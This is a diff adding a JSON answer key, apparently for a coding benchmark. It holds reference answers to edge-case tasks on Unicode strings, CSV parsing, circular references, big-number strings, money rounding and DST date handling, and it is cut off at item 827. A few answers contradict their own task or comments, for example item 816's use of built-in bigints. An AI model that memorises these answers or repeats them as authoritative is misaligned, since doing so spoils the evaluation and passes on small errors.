@@ -1,0 +1,704 @@
+{
+  "answers": {
+    "801": {
+      "id": 801,
+      "answer": "Use the Intl.Segmenter API (or a grapheme-cluster library like graphemer) to split into user-perceived characters, reverse the array, then rejoin. Reversing by code unit (split('')) or code point ([...str]) both break multi-codepoint clusters such as flag emoji (🇺🇸 = U+1F1FA + U+1F1F8), skin-tone modifier sequences (👨‍👩‍👧 ZWJ sequences), or combining diacritics (e + ̈ = ë). Correct implementation:\n\n```js\nfunction reverseGraphemes(str) {\n  const segmenter = new Intl.Segmenter();\n  const clusters = [...segmenter.segment(str)].map(s => s.segment);\n  return clusters.reverse().join('');\n}\n// reverseGraphemes('Hello 🇺🇸') === '🇺🇸 olleH'\n// reverseGraphemes('e\\u0308') === 'e\\u0308'  // ë kept intact\n```\nFor Node <18 or older browsers use the `graphemer` npm package as a drop-in segmenter.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Write a function that reverses a Unicode string by user-perceived characters, not UTF-16 code units. Input: must preserve grapheme clusters exactly."
+    },
+    "802": {
+      "id": 802,
+      "answer": "Apply NFKC normalization, then fold to lowercase (using locale-aware lowercasing), strip or map confusable characters via Unicode confusables data, and compare the canonical form against all existing usernames. Steps: (1) `normalized = username.normalize('NFKC').toLowerCase()`; (2) apply a confusables map (e.g., replace Cyrillic 'а' U+0430 with Latin 'a', etc.); (3) reject if the canonical form already exists in the registry.\n\n```python\nimport unicodedata, re\n\nCONFUSABLES = str.maketrans({'а':'a','е':'e','о':'o','р':'p','с':'c','х':'x'})  # extend as needed\n\ndef canonical(name: str) -> str:\n    n = unicodedata.normalize('NFKC', name).lower()\n    return n.translate(CONFUSABLES)\n\nclass UsernameRegistry:\n    def __init__(self): self._canon = {}\n    def register(self, name):\n        key = canonical(name)\n        if key in self._canon:\n            raise ValueError(f'{name!r} collides with {self._canon[key]!r}')\n        self._canon[key] = name\n```\nFor production use the full Unicode confusables.txt dataset from unicode.org.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Write a validator that rejects visually confusable usernames after Unicode normalization. Treat visually similar characters as collisions if they normalize to the same canonical identifier."
+    },
+    "803": {
+      "id": 803,
+      "answer": "Implement an RFC 4180-compliant state-machine parser that handles: (1) quoted fields spanning multiple lines, (2) doubled quotes as escape, (3) empty fields between consecutive commas, (4) Unicode full-width comma (U+FF0C) treated as a literal character (not a delimiter) unless explicitly configured. Use Python's `csv` module (which handles all RFC 4180 cases) but pre-process Unicode commas if needed:\n\n```python\nimport csv, io\n\ndef parse_csv(text: str, delimiter=',') -> list[list[str]]:\n    # Normalize Unicode commas only if they should NOT be delimiters\n    # text = text.replace('\\uff0c', ',')  # uncomment to treat U+FF0C as delimiter\n    reader = csv.reader(io.StringIO(text), delimiter=delimiter, strict=True)\n    return list(reader)\n\n# Embedded newline example:\n# '\"hello\\nworld\",42' -> [['hello\\nworld', '42']]\n# Empty fields: 'a,,c' -> [['a', '', 'c']]\n# Quoted quote: '\"a\"\"b\"' -> [['a\"b']]\n```\nKey behaviors: embedded newlines inside quotes are part of the field; doubled `\"\"` inside a quoted field represents a literal quote; a field of just `\"\"` is an empty string, not null.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Parse CSV where fields may contain embedded newlines, quotes, empty fields, and Unicode commas."
+    },
+    "804": {
+      "id": 804,
+      "answer": "Turkish has two pairs of i: dotted İ/i and dotless I/ı. English toLowerCase maps 'I' -> 'i', but Turkish maps 'I' -> 'ı' and 'İ' -> 'i'. Using JavaScript's locale-aware methods or Python's locale-aware approach:\n\n```js\n// JavaScript — use locale parameter\nfunction turkishEq(a, b) {\n  return a.toLocaleLowerCase('tr') === b.toLocaleLowerCase('tr');\n}\n// turkishEq('I', 'ı') === true   (Turkish: both become ı)\n// turkishEq('İ', 'i') === true   (Turkish: both become i)\n// 'I'.toLowerCase() === 'i'      // WRONG for Turkish — English rule\n// 'I'.toLocaleLowerCase('tr') === 'ı'  // CORRECT\n```\n\n```python\n# Python — use icu or babel; str.lower() uses English rules\nimport icu\ncollator = icu.Collator.createInstance(icu.Locale('tr_TR'))\nassert collator.compare('I', 'ı') == 0   # Turkish-aware comparison\n```\nNever use `.toLowerCase()` / `.lower()` for Turkish locale; always pass the `'tr'` locale tag.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Implement case-insensitive string comparison for Turkish locale edge cases."
+    },
+    "805": {
+      "id": 805,
+      "answer": "A robust slug generator must handle: empty string → empty string (or raise), whitespace-only → empty string, emoji-only → either strip to empty or transliterate, strings that become empty after stripping → empty string or fallback.\n\n```python\nimport re, unicodedata\n\ndef slugify(text: str, fallback: str = '') -> str:\n    if not text or not text.strip():\n        return fallback\n    # NFKD decompose, drop combining marks\n    text = unicodedata.normalize('NFKD', text)\n    text = ''.join(c for c in text if not unicodedata.combining(c))\n    # lowercase\n    text = text.lower()\n    # replace non-alphanumeric (keep hyphens) with hyphen\n    text = re.sub(r'[^a-z0-9]+', '-', text)\n    # strip leading/trailing hyphens and collapse multiple\n    text = text.strip('-')\n    return text or fallback\n\nassert slugify('') == ''\nassert slugify('   ') == ''\nassert slugify('🚀🎉') == ''  # emojis stripped, returns fallback ''\nassert slugify('Hello, World!') == 'hello-world'\nassert slugify('--foo--') == 'foo'\n```\nEmoji-only input becomes empty after ASCII filtering; always define what to return in that case.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Write a slug generator that handles empty strings, whitespace-only strings, emoji-only strings, and strings that become empty after processing."
+    },
+    "806": {
+      "id": 806,
+      "answer": "Safely summing an array that may contain null, undefined, NaN, Infinity, -Infinity, and mixed types requires explicit filtering and type coercion decisions:\n\n```js\nfunction safeSum(arr) {\n  if (!Array.isArray(arr)) return 0;\n  return arr.reduce((acc, val) => {\n    if (val === null || val === undefined) return acc; // skip nullish\n    const n = Number(val);\n    if (!isFinite(n)) return acc; // skip NaN, Infinity, -Infinity\n    return acc + n;\n  }, 0);\n}\n// safeSum([1, null, undefined, NaN, Infinity, '2', true]) === 4\n// true coerces to 1, '2' to 2, null/undefined/NaN/Infinity skipped\n```\nBehavior decisions: null/undefined are treated as 0-skip (not 0-add); NaN is skipped; Infinity is skipped; booleans coerce to 0/1; string numbers coerce via Number(); non-numeric strings become NaN and are skipped. Document these decisions explicitly for the caller.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Implement a function that safely sums an array of numbers where the input may be null, undefined, NaN, Infinity, -Infinity, and mixed types."
+    },
+    "807": {
+      "id": 807,
+      "answer": "Three distinct states for a query parameter: missing (key absent), empty (key present, value is empty string), explicit null or zero. These must not be conflated:\n\n```ts\ntype ParamState = { present: false } | { present: true; value: string };\n\nfunction getParam(url: URL, key: string): ParamState {\n  if (!url.searchParams.has(key)) return { present: false };\n  return { present: true, value: url.searchParams.get(key) ?? '' };\n}\n\n// Usage:\nconst u1 = new URL('https://x.com/api');\n// getParam(u1, 'q') -> { present: false }   — missing\nconst u2 = new URL('https://x.com/api?q=');\n// getParam(u2, 'q') -> { present: true, value: '' }  — empty\nconst u3 = new URL('https://x.com/api?q=hello');\n// getParam(u3, 'q') -> { present: true, value: 'hello' }  — explicit value\n```\nNever use `params.get(key) || default` — this conflates missing with empty string.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Write a parser for optional query parameters that distinguishes between missing, empty, and explicit values."
+    },
+    "808": {
+      "id": 808,
+      "answer": "JSON.stringify throws on circular references. Replace with a custom serializer using a WeakSet to track seen objects and emit a sentinel instead of recursing:\n\n```js\nfunction safeStringify(value, indent = 0) {\n  const seen = new WeakSet();\n  return JSON.stringify(value, function (key, val) {\n    if (typeof val === 'object' && val !== null) {\n      if (seen.has(val)) return '[Circular]';\n      seen.add(val);\n    }\n    return val;\n  }, indent);\n}\n\nconst a = { x: 1 };\na.self = a;\nsafeStringify(a); // '{\"x\":1,\"self\":\"[Circular]\"}'\n\nconst arr = [1, 2];\narr.push(arr);\nsafeStringify(arr); // '[1,2,\"[Circular]\"]'\n```\nThe WeakSet approach works for objects and arrays. Primitives (strings, numbers) are never circular. The sentinel `'[Circular]'` is a string; deserializing will not restore the cycle, which is expected since JSON cannot represent cycles.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Implement JSON serialization for an object graph containing circular references. Instead of crashing, emit a sentinel value."
+    },
+    "809": {
+      "id": 809,
+      "answer": "Deep-clone handling Dates, Maps, Sets, RegExps, and circular references requires a recursive traversal with a Map to track seen objects:\n\n```js\nfunction deepClone(value, seen = new Map()) {\n  if (value === null || typeof value !== 'object') return value;\n  if (seen.has(value)) return seen.get(value); // circular: return same clone ref\n  if (value instanceof Date) return new Date(value.getTime());\n  if (value instanceof RegExp) return new RegExp(value.source, value.flags);\n  if (value instanceof Map) {\n    const m = new Map();\n    seen.set(value, m);\n    value.forEach((v, k) => m.set(deepClone(k, seen), deepClone(v, seen)));\n    return m;\n  }\n  if (value instanceof Set) {\n    const s = new Set();\n    seen.set(value, s);\n    value.forEach(v => s.add(deepClone(v, seen)));\n    return s;\n  }\n  const clone = Array.isArray(value) ? [] : Object.create(Object.getPrototypeOf(value));\n  seen.set(value, clone);\n  for (const key of Reflect.ownKeys(value)) {\n    clone[key] = deepClone(value[key], seen);\n  }\n  return clone;\n}\n```\nUsing `Map` (not `WeakMap`) as the seen registry is necessary here because we need to return the cloned reference for cycles, and WeakMap cannot return values in the same lookup path.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Deep-clone an object that may contain nested arrays, Dates, Maps, Sets, RegExps, and circular references."
+    },
+    "810": {
+      "id": 810,
+      "answer": "Recursive equality at depth 100,000 will cause a stack overflow. Use an iterative approach with an explicit stack of pairs to compare:\n\n```js\nfunction deepEqual(a, b) {\n  const stack = [[a, b]];\n  const seen = new Map(); // handle circular refs\n  while (stack.length) {\n    let [x, y] = stack.pop();\n    if (x === y) continue;\n    if (x === null || y === null || typeof x !== 'object' || typeof y !== 'object') return false;\n    // circular reference guard\n    if (seen.get(x) === y) continue;\n    seen.set(x, y);\n    const xKeys = Object.keys(x), yKeys = Object.keys(y);\n    if (xKeys.length !== yKeys.length) return false;\n    for (const k of xKeys) {\n      if (!Object.prototype.hasOwnProperty.call(y, k)) return false;\n      stack.push([x[k], y[k]]);\n    }\n  }\n  return true;\n}\n```\nThe iterative approach uses the heap instead of the call stack, so depth 100,000 is safe. The `seen` map prevents infinite loops for circular structures. Note: key order does not matter since we check both key counts and individual membership.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Compare two deeply nested objects for structural equality without stack overflow at depth 100,000."
+    },
+    "811": {
+      "id": 811,
+      "answer": "Flatten with special handling for empty objects `{}`, empty arrays `[]`, and keys containing dots:\n\n```js\nfunction flatten(obj, prefix = '', result = {}) {\n  if (obj === null || typeof obj !== 'object') {\n    result[prefix] = obj;\n    return result;\n  }\n  const keys = Object.keys(obj);\n  if (keys.length === 0) {\n    // empty object or array: preserve as leaf\n    result[prefix] = Array.isArray(obj) ? [] : {};\n    return result;\n  }\n  for (const key of keys) {\n    // Escape dots in keys to avoid ambiguity\n    const escapedKey = key.replace(/\\./g, '\\\\.');\n    const newKey = prefix ? `${prefix}.${escapedKey}` : escapedKey;\n    flatten(obj[key], newKey, result);\n  }\n  return result;\n}\n// flatten({a: {b: {}}, c: []}) -> {'a.b': {}, 'c': []}\n// flatten({'a.b': 1}) -> {'a\\\\.b': 1}  (dot escaped)\n```\nWithout escaping dots in keys, `{\"a.b\": 1}` and `{a: {b: 1}}` would produce identical flattened output, making unflattening ambiguous.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Flatten a nested object into dot-path keys while preserving empty objects, empty arrays, and keys that contain dots."
+    },
+    "812": {
+      "id": 812,
+      "answer": "Unflatten with conflict detection: a path conflict occurs when one key implies a value at a node that another key treats as an intermediate object (e.g., 'a' as a leaf and 'a.b' as a path through it):\n\n```js\nfunction unflatten(flat) {\n  const result = {};\n  for (const [path, val] of Object.entries(flat)) {\n    // Split on unescaped dots\n    const parts = path.split(/(?<!\\\\)\\./).map(p => p.replace(/\\\\\\./g, '.'));\n    let cur = result;\n    for (let i = 0; i < parts.length - 1; i++) {\n      const p = parts[i];\n      if (p in cur) {\n        if (typeof cur[p] !== 'object' || cur[p] === null) {\n          throw new Error(`Conflict: '${parts.slice(0,i+1).join('.')}' is both a leaf and an intermediate node`);\n        }\n      } else {\n        cur[p] = {};\n      }\n      cur = cur[p];\n    }\n    const last = parts[parts.length - 1];\n    if (last in cur && typeof cur[last] === 'object' && cur[last] !== null && !Array.isArray(cur[last])) {\n      throw new Error(`Conflict: '${path}' would overwrite an intermediate node`);\n    }\n    cur[last] = val;\n  }\n  return result;\n}\n```\nThe lookbehind `(?<!\\\\)\\.` splits on unescaped dots only, handling keys that contain literal dots.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Unflatten dot-path keys back into an object. Detect and reject conflicts such as both a leaf and an intermediate node at the same path."
+    },
+    "813": {
+      "id": 813,
+      "answer": "Recursive config merge where arrays are replaced (not merged) and null/undefined override:\n\n```js\nfunction mergeConfig(base, override) {\n  if (override === null || override === undefined) return override; // explicit null wins\n  if (Array.isArray(override)) return [...override]; // arrays replaced, not merged\n  if (typeof override !== 'object') return override; // primitive wins\n  if (typeof base !== 'object' || base === null || Array.isArray(base)) return { ...override };\n  const result = { ...base };\n  for (const [key, val] of Object.entries(override)) {\n    if (Object.prototype.hasOwnProperty.call(base, key)) {\n      result[key] = mergeConfig(base[key], val);\n    } else {\n      result[key] = val;\n    }\n  }\n  return result;\n}\n// mergeConfig({a:[1,2],b:{c:1}}, {a:[3],b:{d:2}})\n// -> {a:[3], b:{c:1,d:2}}\n// Arrays replaced: [1,2] -> [3]\n// Objects merged: {c:1} + {d:2} -> {c:1,d:2}\n```\nThe key design decision: arrays are always replaced by the override value, never concatenated. Undefined in override means 'do not change'; null means 'set to null'.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Merge two configuration objects recursively where arrays must be replaced, not concatenated."
+    },
+    "814": {
+      "id": 814,
+      "answer": "A safe integer parser that rejects leading/trailing spaces, hex (0x), octal (0o), binary (0b), floats, and non-decimal strings:\n\n```js\nfunction parseDecimalInt(s) {\n  if (typeof s !== 'string') throw new TypeError('Input must be a string');\n  if (!/^-?[0-9]+$/.test(s)) throw new RangeError(`Invalid integer: ${JSON.stringify(s)}`);\n  // Reject leading zeros (except '0' itself)\n  if (/^-?0[0-9]/.test(s)) throw new RangeError(`Leading zeros not allowed: ${JSON.stringify(s)}`);\n  const n = Number(s);\n  if (!Number.isSafeInteger(n)) throw new RangeError(`Out of safe integer range: ${s}`);\n  return n;\n}\n// parseDecimalInt(' 1')  throws — leading space\n// parseDecimalInt('1 ')  throws — trailing space\n// parseDecimalInt('0x1') throws — non-decimal chars\n// parseDecimalInt('01')  throws — leading zero\n// parseDecimalInt('1.0') throws — dot\n// parseDecimalInt('-5')  -> -5\n```\nThe regex `^-?[0-9]+$` is the core guard; the leading-zero check prevents octal-like ambiguity.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Implement a safe integer parser that accepts decimal strings only and rejects leading/trailing spaces, hex, octal, binary, and floats."
+    },
+    "815": {
+      "id": 815,
+      "answer": "Convert a large decimal string to binary without built-in BigInt by repeated division by 2 (using string-based long division):\n\n```python\ndef decimal_to_binary(dec: str) -> str:\n    # Validate\n    if not dec or not dec.lstrip('-').isdigit():\n        raise ValueError(f'Not a decimal integer: {dec!r}')\n    negative = dec.startswith('-')\n    digits = dec.lstrip('-')\n    if digits == '0': return '0'\n\n    def divmod2(num_str):\n        remainder = 0\n        result = []\n        for ch in num_str:\n            cur = remainder * 10 + int(ch)\n            result.append(str(cur // 2))\n            remainder = cur % 2\n        # remove leading zeros from quotient\n        q = ''.join(result).lstrip('0') or '0'\n        return q, remainder\n\n    bits = []\n    while digits != '0':\n        digits, bit = divmod2(digits)\n        bits.append(str(bit))\n\n    result = ''.join(reversed(bits))\n    return ('-' + result) if negative else result\n\nassert decimal_to_binary('10') == '1010'\nassert decimal_to_binary('0') == '0'\n```\nEach iteration of the while loop runs in O(n) where n is the number of decimal digits, so total complexity is O(n²). For 10,000-digit numbers this is acceptable (Python BigInt would be O(n log n) via FFT, but this avoids the built-in).",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Convert extremely large decimal strings to binary without using built-in big integer types."
+    },
+    "816": {
+      "id": 816,
+      "answer": "Compute modular exponentiation (base^exp mod modulus) for huge decimal-string integers without built-in bigint. Use string-based big integer arithmetic with fast modular exponentiation (square-and-multiply):\n\n```python\n# Python solution using only string-to-int conversion for demonstration\n# (For truly no-built-in-bigint, implement string arithmetic; Python's int IS arbitrary precision)\n\ndef bigmod_exp(base_s: str, exp_s: str, mod_s: str) -> str:\n    # Convert decimal strings to Python int (which supports arbitrary precision)\n    b, e, m = int(base_s), int(exp_s), int(mod_s)\n    if m == 1: return '0'\n    result = 1\n    b = b % m\n    while e > 0:\n        if e % 2 == 1:\n            result = (result * b) % m\n        e //= 2\n        b = (b * b) % m\n    return str(result)\n\n# If truly avoiding Python int, implement karatsuba multiply + mod on digit arrays\n# and use the same square-and-multiply loop on the exponent's binary representation.\n```\nKey points: (1) square-and-multiply reduces O(exp) multiplications to O(log exp); (2) take mod after every multiply to keep intermediate values bounded by mod²; (3) parse the exponent's binary digits by repeated division-by-2 on the digit string.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Compute modular exponentiation for huge integers provided as decimal strings up to 10,000 digits."
+    },
+    "817": {
+      "id": 817,
+      "answer": "Sort decimal strings numerically by parsing, handling negatives and leading zeros:\n\n```python\ndef sort_decimal_strings(lst: list[str]) -> list[str]:\n    def key(s: str):\n        s = s.strip()\n        # Remove leading zeros preserving sign\n        neg = s.startswith('-')\n        stripped = s.lstrip('-').lstrip('0') or '0'\n        numeric = int(('-' if neg else '') + stripped)\n        return numeric\n    return sorted(lst, key=key)\n\nassert sort_decimal_strings(['-10','002','1','-002','0','10']) == ['-10','-002','0','002','1','10']\n# Stable sort: equal numeric values maintain original order\n```\nAlternatively in JavaScript:\n```js\nconst sortDecStrs = arr => [...arr].sort((a,b) => {\n  const na = BigInt(a.trim()), nb = BigInt(b.trim());\n  return na < nb ? -1 : na > nb ? 1 : 0;\n});\n```\nLexicographic sort would place '-10' after '-002' and '10' before '2' — both wrong. The numeric key converts each string to its true integer value first.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Sort a list of decimal strings numerically, not lexicographically, including negatives and leading zeros."
+    },
+    "818": {
+      "id": 818,
+      "answer": "Exact decimal addition for money requires avoiding floating-point representation errors. Represent values as scaled integers (cents):\n\n```python\nfrom decimal import Decimal, ROUND_HALF_EVEN\n\ndef add_money(*amounts: str) -> str:\n    total = sum(Decimal(a) for a in amounts)\n    # Round to 2 decimal places using banker's rounding\n    return str(total.quantize(Decimal('0.01'), rounding=ROUND_HALF_EVEN))\n\nassert add_money('0.1', '0.2') == '0.30'   # not 0.30000000000000004\nassert add_money('1.005', '0') == '1.00'    # or '1.01' depending on rounding choice\nassert add_money('-0.50', '1.00') == '0.50'\n```\nAlternatively using integer cents:\n```python\ndef parse_cents(s: str) -> int:\n    d = Decimal(s)\n    return int(d.quantize(Decimal('0.01')) * 100)\n\ndef add_money_cents(*amounts: str) -> str:\n    total = sum(parse_cents(a) for a in amounts)\n    return f'{total // 100}.{abs(total % 100):02d}'\n```\nNever use `float` for money arithmetic; `0.1 + 0.2 == 0.30000000000000004` in IEEE 754.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Implement exact decimal addition for money values represented as strings."
+    },
+    "819": {
+      "id": 819,
+      "answer": "Bankers' rounding (round-half-to-even) rounds to the nearest even digit on exact halfway cases. Python's `Decimal` module supports this natively:\n\n```python\nfrom decimal import Decimal, ROUND_HALF_EVEN\n\ndef bankers_round(value: str, places: int) -> str:\n    quant = Decimal('0.' + '0' * places) if places > 0 else Decimal('1')\n    return str(Decimal(value).quantize(quant, rounding=ROUND_HALF_EVEN))\n\nassert bankers_round('2.5', 0) == '2'   # halfway, round to even (2)\nassert bankers_round('3.5', 0) == '4'   # halfway, round to even (4)\nassert bankers_round('2.45', 1) == '2.4'  # halfway, round to even (4)\nassert bankers_round('2.55', 1) == '2.6'  # halfway, round to even (6)\nassert bankers_round('2.450001', 1) == '2.5'  # NOT halfway, normal round up\n```\nJavaScript's `Math.round` always rounds half-up (not bankers'). For JS, use a custom implementation:\n```js\nfunction bankersRound(n, places) {\n  const factor = 10 ** places;\n  const shifted = n * factor;\n  const floor = Math.floor(shifted);\n  const diff = shifted - floor;\n  if (Math.abs(diff - 0.5) < Number.EPSILON) {\n    return (floor % 2 === 0 ? floor : floor + 1) / factor;\n  }\n  return Math.round(shifted) / factor;\n}\n```",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Round decimal strings using bankers' rounding to a specified number of places. Test exact halfway cases."
+    },
+    "820": {
+      "id": 820,
+      "answer": "Floating-point comparison traps: `0.1 + 0.2 !== 0.3` in IEEE 754. A rules engine comparing float sums to literal thresholds must use epsilon-based or scaled-integer comparison:\n\n```js\n// WRONG: 0.1 + 0.2 === 0.3 is false\nfunction isEqual_bad(a, b) { return a === b; }\n\n// CORRECT: epsilon comparison for computed values\nconst EPSILON = 1e-10;\nfunction isEqual(a, b, eps = EPSILON) {\n  return Math.abs(a - b) <= eps * Math.max(1, Math.abs(a), Math.abs(b));\n}\n\n// CORRECT for money: use Decimal or integer cents\nimport { Decimal } from 'decimal.js';\nfunction ruleCheck(a, b) {\n  return new Decimal(a).equals(new Decimal(b));\n}\n```\nBehaviors: `0.1 + 0.2` evaluates to `0.30000000000000004`; `0.1 + 0.2 === 0.3` is `false`; `isEqual(0.1+0.2, 0.3)` is `true`. For rules engines dealing with exact monetary amounts, always use Decimal arithmetic. For computed scientific values, use relative epsilon. Document the epsilon choice.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Detect floating-point comparison traps in a rules engine handling sums like 0.1+0.2 compared to 0.3."
+    },
+    "821": {
+      "id": 821,
+      "answer": "Calendar-day difference across DST requires working in the target timezone, not UTC, because a UTC difference of 23h or 25h may be 1 day in local time:\n\n```python\nfrom datetime import datetime\nimport zoneinfo\n\ndef calendar_day_diff(ts1: datetime, ts2: datetime, tz_name: str) -> int:\n    tz = zoneinfo.ZoneInfo(tz_name)\n    # Convert both to the target timezone\n    d1 = ts1.astimezone(tz).date()\n    d2 = ts2.astimezone(tz).date()\n    return (d2 - d1).days\n\n# Example: DST spring-forward means March 8 2020 02:00 -> 03:00 in US/Eastern\n# A 23-hour gap can still be 1 calendar day\nfrom datetime import timezone\nt1 = datetime(2020, 3, 8, 7, 0, tzinfo=timezone.utc)   # 2020-03-08 02:00 ET\nt2 = datetime(2020, 3, 9, 6, 0, tzinfo=timezone.utc)   # 2020-03-09 02:00 ET\nassert calendar_day_diff(t1, t2, 'America/New_York') == 1\n```\nNever compute `(ts2 - ts1).days` directly on UTC timedelta — that gives seconds/86400 which is wrong across DST boundaries.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Write a function that computes the difference in whole calendar days between two timestamps across DST boundaries."
+    },
+    "822": {
+      "id": 822,
+      "answer": "When a local wall time does not exist (DST spring-forward gap), there are two strategies: fold to the time after the gap (fold=1) or raise an error. Python's zoneinfo uses the `fold` attribute:\n\n```python\nfrom datetime import datetime\nimport zoneinfo\n\ndef local_to_utc_nonexistent(year, month, day, hour, minute, tz_name, strategy='post_gap'):\n    tz = zoneinfo.ZoneInfo(tz_name)\n    # fold=0 means before the transition, fold=1 means after\n    fold = 1 if strategy == 'post_gap' else 0\n    local = datetime(year, month, day, hour, minute, fold=fold, tzinfo=tz)\n    return local.astimezone(zoneinfo.ZoneInfo('UTC'))\n\n# 2020-03-08 02:30 in America/New_York does not exist (clocks jump 02:00->03:00)\nutc = local_to_utc_nonexistent(2020, 3, 8, 2, 30, 'America/New_York', 'post_gap')\n# Returns 2020-03-08T07:30Z (treats as 03:30 EDT)\n```\nThe caller must explicitly choose: raise an exception, map to the pre-gap equivalent, or map to the post-gap equivalent. Silent coercion to either boundary without documentation is a bug.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Convert a local wall time that does not exist due to DST spring-forward to UTC. Define whether to raise or adjust."
+    },
+    "823": {
+      "id": 823,
+      "answer": "When a local wall time is ambiguous (DST fall-back), the same clock time occurs twice. Resolution requires the caller to specify which occurrence (fold=0 = first/pre-transition, fold=1 = second/post-transition):\n\n```python\nfrom datetime import datetime\nimport zoneinfo\n\ndef local_to_utc_ambiguous(year, month, day, hour, minute, tz_name, occurrence: int):\n    \"\"\"occurrence: 1=first (DST), 2=second (standard)\"\"\"\n    if occurrence not in (1, 2):\n        raise ValueError('occurrence must be 1 or 2')\n    tz = zoneinfo.ZoneInfo(tz_name)\n    fold = 0 if occurrence == 1 else 1\n    local = datetime(year, month, day, hour, minute, fold=fold, tzinfo=tz)\n    return local.astimezone(zoneinfo.ZoneInfo('UTC'))\n\n# 2020-11-01 01:30 in America/New_York is ambiguous (EDT or EST)\nutc1 = local_to_utc_ambiguous(2020, 11, 1, 1, 30, 'America/New_York', 1)\n# 2020-11-01T05:30Z (1:30 EDT)\nutc2 = local_to_utc_ambiguous(2020, 11, 1, 1, 30, 'America/New_York', 2)\n# 2020-11-01T06:30Z (1:30 EST)\nassert utc1 != utc2\n```\nNever silently pick one occurrence — always require the caller to declare which.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Convert a local wall time that is ambiguous due to DST fall-back to UTC. Require explicit selection of which occurrence."
+    },
+    "824": {
+      "id": 824,
+      "answer": "Adding one calendar month to month-end dates requires 'end-of-month clamping' — if the target month is shorter, clamp to its last day:\n\n```python\nfrom datetime import date\nimport calendar\n\ndef add_one_month(d: date) -> date:\n    month = d.month % 12 + 1\n    year = d.year + (d.month // 12)\n    # Clamp day to last day of target month\n    max_day = calendar.monthrange(year, month)[1]\n    return d.replace(year=year, month=month, day=min(d.day, max_day))\n\nassert add_one_month(date(2024, 1, 31)) == date(2024, 2, 29)  # 2024 leap year\nassert add_one_month(date(2023, 1, 31)) == date(2023, 2, 28)  # non-leap\nassert add_one_month(date(2024, 3, 31)) == date(2024, 4, 30)  # April has 30 days\nassert add_one_month(date(2024, 12, 31)) == date(2025, 1, 31) # year rollover\nassert add_one_month(date(2024, 2, 29)) == date(2024, 3, 29)  # mid-month no clamp\n```\nThe 'clamping' policy (Jan 31 + 1 month = Feb 28/29, not March 2/3) is a deliberate choice for financial calculations. Some systems use the 'overflow' policy instead — document which is used.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Add one calendar month to dates at month-end. Test Jan 31, leap-day, and behavior when the target month is shorter."
+    },
+    "825": {
+      "id": 825,
+      "answer": "Computing age must handle leap-day birthdays (Feb 29) and timezone-aware 'today':\n\n```python\nfrom datetime import datetime, date\nimport zoneinfo\n\ndef compute_age(birthdate: date, now: datetime, tz_name: str) -> int:\n    tz = zoneinfo.ZoneInfo(tz_name)\n    today = now.astimezone(tz).date()\n    # Leap day birthdays: treat Feb 28 as birthday in non-leap years\n    try:\n        birthday_this_year = birthdate.replace(year=today.year)\n    except ValueError:  # Feb 29 in non-leap year\n        birthday_this_year = date(today.year, 3, 1)  # or Feb 28, by policy\n    age = today.year - birthdate.year\n    if today < birthday_this_year:\n        age -= 1\n    return age\n\n# Person born 2000-02-29, today is 2025-02-28\n# birthday_this_year -> 2025-03-01 (non-leap)\n# today (2025-02-28) < 2025-03-01, so age = 25 - 1 = 24  (not yet turned 25)\n```\nTimezone matters: someone born at 11pm UTC may be a different date in local time.",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Compute a person's age in years from birthdate and timezone-aware current timestamp. Handle leap-day birthdays."
+    },
+    "826": {
+      "id": 826,
+      "answer": "ISO 8601 parsing with full validation including offsets, fractional seconds, and missing timezone:\n\n```python\nfrom datetime import datetime, timezone\nimport re\n\nISO8601_RE = re.compile(\n    r'^(\\d{4})-(\\d{2})-(\\d{2})'\n    r'[T ](\\d{2}):(\\d{2}):(\\d{2})'\n    r'(\\.\\d+)?'\n    r'(Z|[+-]\\d{2}:?\\d{2})?$'\n)\n\ndef parse_iso8601(s: str, require_tz: bool = True) -> datetime:\n    m = ISO8601_RE.match(s)\n    if not m:\n        raise ValueError(f'Invalid ISO 8601: {s!r}')\n    tz_str = m.group(8)\n    if require_tz and not tz_str:\n        raise ValueError(f'Timezone required but missing in: {s!r}')\n    try:\n        dt = datetime.fromisoformat(s.replace('Z', '+00:00'))\n    except ValueError as e:\n        raise ValueError(f'Invalid date/time components: {e}') from e\n    return dt\n\n# parse_iso8601('2024-01-15T10:30:00Z')           -> OK\n# parse_iso8601('2024-01-15T10:30:00.123+05:30')  -> OK\n# parse_iso8601('2024-01-15T10:30:00')            -> raises (missing tz)\n# parse_iso8601('2024-13-01T00:00:00Z')           -> raises (invalid month)\n```",
+      "tier": "T4",
+      "category": "edge_cases",
+      "task": "Parse ISO 8601 timestamps with offsets, fractional seconds, and missing timezone. Reject invalid formats."
+    },
+    "827": {
+      "id": 827,
